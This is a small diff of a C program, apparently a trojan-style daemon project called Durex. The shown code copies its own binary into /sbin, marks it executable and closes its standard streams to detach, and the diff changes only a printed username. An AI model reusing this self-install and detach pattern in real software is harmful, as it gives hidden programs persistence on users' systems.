@@ -12,7 +12,7 @@ int		main(int ac, char **av, char **envp)
 	snprintf(buf2, 255, "cp %s /sbin/Durex && chmod u+x /sbin/Durex", buf);
 	if (strcmp(buf, "/sbin/Durex") && strcmp(buf, "/usr/sbin/Durex"))
 	{
-		printf("nsayah\n");
+		printf("maabou-h\n");
 		close(0);
 		close(1);
 		close(2);
